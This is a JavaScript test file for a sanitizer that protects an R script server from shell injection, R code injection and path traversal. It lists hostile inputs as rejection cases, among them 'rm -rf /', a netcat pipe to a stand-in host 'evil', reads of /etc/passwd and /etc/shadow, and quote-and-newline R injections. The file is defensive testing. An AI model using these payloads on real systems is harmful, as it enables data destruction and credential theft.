// M1-3 R 脚本注入防护测试
// 运行：node --test test/sanitizer.test.mjs
import assert from 'node:assert/strict';
import { sanitizeParam, assertSafePath, sanitizeRString } from '../r-server/sanitizer.js';

// === sanitizeParam：R 脚本参数白名单 ===

// 正常文件名/参数应通过
assert.strictEqual(sanitizeParam('normal_sample.csv'), 'normal_sample.csv');
assert.strictEqual(sanitizeParam('foo-bar_1.txt'), 'foo-bar_1.txt');
assert.strictEqual(sanitizeParam('path/to/file.R'), 'path/to/file.R');
assert.strictEqual(sanitizeParam('deseq2'), 'deseq2');
console.log('✓ sanitizeParam 正常值通过');

// shell 元字符注入应被拒
assert.strictEqual(sanitizeParam("foo.txt'; system('rm -rf /')#"), null);
assert.strictEqual(sanitizeParam('$(whoami)'), null);
assert.strictEqual(sanitizeParam('foo`reboot`'), null);
assert.strictEqual(sanitizeParam('a && rm -rf /'), null);
assert.strictEqual(sanitizeParam('foo|nc evil 4444'), null);
assert.strictEqual(sanitizeParam('a;cat /etc/passwd'), null);
console.log('✓ sanitizeParam shell 注入拒绝通过');

// R 代码注入（通过参数拼进 R 脚本）
assert.strictEqual(sanitizeParam('file")\nsystem("rm -rf /")'), null); // 换行+引号
assert.strictEqual(sanitizeParam('x"))\nlibrary(malware)'), null);
console.log('✓ sanitizeParam R 代码注入拒绝通过');

// 非字符串
assert.strictEqual(sanitizeParam(null), null);
assert.strictEqual(sanitizeParam(undefined), null);
assert.strictEqual(sanitizeParam(123), null);
assert.strictEqual(sanitizeParam(''), null);
console.log('✓ sanitizeParam 非法类型拒绝通过');

// === assertSafePath：路径穿越防护 ===

assert.doesNotThrow(() => assertSafePath('/Users/x/data/a.csv', '/Users/x/data'));
assert.doesNotThrow(() => assertSafePath('/Users/x/data/sub/b.csv', '/Users/x/data'));
console.log('✓ assertSafePath 合法路径通过');

assert.throws(() => assertSafePath('/Users/x/../../etc/passwd', '/Users/x/data'));
assert.throws(() => assertSafePath('/Users/x/data/../../../etc/shadow', '/Users/x/data'));
assert.throws(() => assertSafePath('/etc/passwd', '/Users/x/data'));
assert.throws(() => assertSafePath('/Users/other/data/file.csv', '/Users/x/data'));
console.log('✓ assertSafePath 路径穿越拒绝通过');

// === sanitizeRString：R 字符串内容转义（用于插值进 "..." 内的值）===

// 正常值原样返回
assert.strictEqual(sanitizeRString('normal value'), 'normal value');
assert.strictEqual(sanitizeRString('sample_01'), 'sample_01');
console.log('✓ sanitizeRString 正常值通过');

// 引号转义——防闭合 R 字符串后注入。转义后所有裸 " 应变成 \"
const r1 = sanitizeRString('x"y');
assert.ok(!r1.includes('"') || r1.replace(/\\"/g, '').indexOf('"') === -1, '双引号应被转义为 \\"');
assert.ok(r1.includes('\\"'), '应含转义后的 \\"');
// 反斜杠转义
const escaped = sanitizeRString('a\\b');
assert.ok(escaped.includes('\\\\'), '反斜杠应被转义');
console.log('✓ sanitizeRString 引号/反斜杠转义通过');

// 危险字符直接拒绝（换行、回车——防 R 代码注入）
assert.strictEqual(sanitizeRString('a\nb'), null);
assert.strictEqual(sanitizeRString('a\rb'), null);
console.log('✓ sanitizeRString 换行注入拒绝通过');

console.log('\n所有 sanitizer 测试通过');
